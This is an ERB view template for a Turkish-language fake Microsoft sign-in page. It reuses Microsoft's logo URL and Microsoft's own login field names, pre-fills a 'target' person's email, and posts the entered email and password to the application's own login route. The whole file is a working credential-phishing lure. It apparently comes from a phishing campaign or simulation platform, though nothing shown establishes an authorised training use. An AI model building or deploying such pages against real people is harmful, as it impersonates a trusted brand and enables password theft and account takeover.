<% content_for :title, "Hesabınızda oturum açın" %>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
    background-color: var(--brand-ice); 
    display: flex; align-items: center; justify-content: center;
    min-height: 100vh; overflow: hidden;
  }
  .background-image-holder {
    display: none; /* Microsoft image removed to stick to High-Contrast Ice Brand */
  }
  .login-container {
    position: relative; z-index: 1;
    background: #ffffff; padding: 44px; width: 440px; max-width: 100%;
    box-shadow: 0 20px 40px rgba(0,3,61,0.1);
    border: 1px solid var(--brand-azure);
  }
  .logo { width: 100px; margin-bottom: 24px; }
  h1 { font-size: 24px; font-weight: 900; color: var(--brand-midnight); margin-bottom: 12px; text-transform: uppercase; font-style: italic; }
  .subtitle { font-size: 15px; color: var(--brand-azure); margin-bottom: 24px; font-weight: bold; }
  input {
    width: 100%; font-size: 15px; padding: 8px 0;
    background: transparent;
    border: none; border-bottom: 1px solid var(--brand-azure); outline: none; margin-bottom: 16px;
    color: var(--brand-midnight);
  }
  input:focus { border-bottom: 2px solid var(--brand-azure); }
  ::placeholder { color: var(--brand-midnight); opacity: 0.2; }
  .options { font-size: 13px; margin-bottom: 28px; color: var(--brand-midnight); opacity: 0.6; }
  .options a { color: var(--brand-azure); text-decoration: none; font-weight: bold; }
  .btn-container { display: flex; justify-content: flex-end; }
  .footer {
    background: #ffffff;
    padding: 12px 24px; font-size: 10px; color: var(--brand-azure);
    display: flex; gap: 16px; position: fixed; bottom: 0; width: 100%;
    text-transform: uppercase; font-weight: bold; letter-spacing: 0.1em; z-index: 2;
    border-top: 1px solid var(--brand-ice);
  }
  .footer a { color: var(--brand-azure); text-decoration: none; }
</style>

<div class="background-image-holder">
  <div class="background-image"></div>
</div>

<div class="login-container">
  <img class="logo"
       src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.svg"
       alt="Microsoft">
  <h1>Oturum açın</h1>

  <%= form_with url: auth_login_path, method: :post, local: true do %>
    <input type="email" name="loginfmt" placeholder="E-posta, telefon veya Skype"
           value="<%= @target&.email %>" required autofocus>
    <input type="password" name="passwd" placeholder="Parola" required>

    <div class="options">
      Hesabınız yok mu? <a href="#">Hesap oluşturun!</a><br>
      <a href="#">Hesabınıza erişemiyor musunuz?</a>
    </div>

    <div class="submit-row flex justify-end">
      <button type="submit" class="btn-command !text-xs !py-2 !px-8">Oturum aç</button>
    </div>
  <% end %>
</div>

<div class="footer">
  <a href="#">Kullanım koşulları</a>
  <a href="#">Gizlilik ve çerezler</a>
  <a href="#">...</a>
</div>
